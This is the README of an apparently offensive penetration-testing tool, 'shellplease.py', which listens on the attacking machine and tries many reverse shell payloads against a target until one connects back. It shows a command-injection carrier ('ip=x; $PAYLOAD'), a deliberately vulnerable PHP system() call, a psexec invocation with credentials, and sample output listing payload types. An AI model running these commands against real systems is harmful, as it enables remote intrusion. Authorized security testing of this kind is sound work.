# Shell? Please?
This tool checks multiple reverse shell payloads usability.
It opens a local tcp port on the attacking machine, similar to `nc -nlvp`,
then sends predefined payloads with a user supplied carrier
and waits for reverse connections.

## Carrier
The user can supply either a script or a command to carry the payload.

### Command Carrier
```sh
# command carrier should use a PAYLOAD env variable as payload
# note: something is not a real command, fool
shellplease.py --command-carrier "something \$PAYLOAD"
shellplease.py -c "something \$PAYLOAD"
```

### Script Carrier
```sh
shellplease.py -s carrier.sh
```
```sh
#!/bin/sh
# carrier.sh

something $PAYLOAD
```

## Examples
### OS Command Inject via HTTP
Imagine a webpage that executes a shell command with an argument provided by the user
```php
system("ping " . $_GET['ip'])
```

We can use shellplease to see what executables/commands can be used to obtain a reverse shell
```sh
# attacker: 192.168.1.100
# target: 192.168.1.5
shellplease.py -H 192.168.1.100 -c "curl http://192.168.1.5/ -G --data-urlencode \"ip=x; \$PAYLOAD\""
```

Alternatively, we can use a script to carry the payload
```sh
#!/bin/sh
# carrier.sh
curl http://192.168.1.5/ -G --data-urlencode "ip=x; $PAYLOAD"
```

### Command Execution vis PSExec
Now, imagine you have credentials to some user account in a windows/ad environment.
You could use the following:
```sh
# attacker: 192.168.1.100
# target: 192.168.1.5
shellplease.py --os windows --local-host 192.168.1.100 -c "impacket-psexec DOMAIN/USER:PASS@192.168.1.5 \"\$PAYLOAD\""
```

Sample output:
```
[+] started http server on 192.168.1.100:55067
[+] started tcp listener on 192.168.1.100:34921
[-] ncat.exe -e w/ download over cmd.exe
[-] ncat.exe -e w/ download over powershell.exe
[-] PHP exec
[-] PHP system
[-] PHP `
[-] PHP popen
[-] PHP proc_open
[+] Windows ConPty
```

## Usage
```
usage: shellplease.py [-h] [-H HOST] [-s CARRIER_SCRIPT] [-c CARRIER_COMMAND] [-C CONFIG] [-os {linux,windows,mac}]
                      [-sh REMOTE_SHELL] [-p PORT] [-P HTTP_SERVER_PORT] [-a] [-ct CONNECTION_TIMEOUT] [-et ECHO_TIMEOUT]
                      [-po]

Shell? Please?

optional arguments:
  -h, --help            show this help message and exit
  -H HOST, --host HOST, --local-host HOST
                        local host (default: )
  -s CARRIER_SCRIPT, --carrier-script CARRIER_SCRIPT
                        shell script that sends the payload to the target, it should use a PAYLOAD env variable as payload
                        (default: )
  -c CARRIER_COMMAND, --carrier-command CARRIER_COMMAND
                        shell command that sends the payload to the target, it should use a PAYLOAD env variable as payload
                        (default: )
  -C CONFIG, --config CONFIG
                        .json configuration file location (default: config.json)
  -os {linux,windows,mac}, --os {linux,windows,mac}
                        target operating system (default: linux)
  -sh REMOTE_SHELL, --remote-shell REMOTE_SHELL
                        shell to be executed (default: )
  -p PORT, --port PORT, --local-port PORT
                        local port (default: 0)
  -P HTTP_SERVER_PORT, -hp HTTP_SERVER_PORT, --http-server-port HTTP_SERVER_PORT
                        http port to serve assets (default: 0)
  -a, --all             check all payloads (default: False)
  -ct CONNECTION_TIMEOUT, --connection-timeout CONNECTION_TIMEOUT
                        connection accept timeout in seconds (default: 1)
  -et ECHO_TIMEOUT, --echo-timeout ECHO_TIMEOUT
                        echo check timeout in seconds (default: 3)
  -po, --print-only     print paylods only, don't check. (default: False)
```

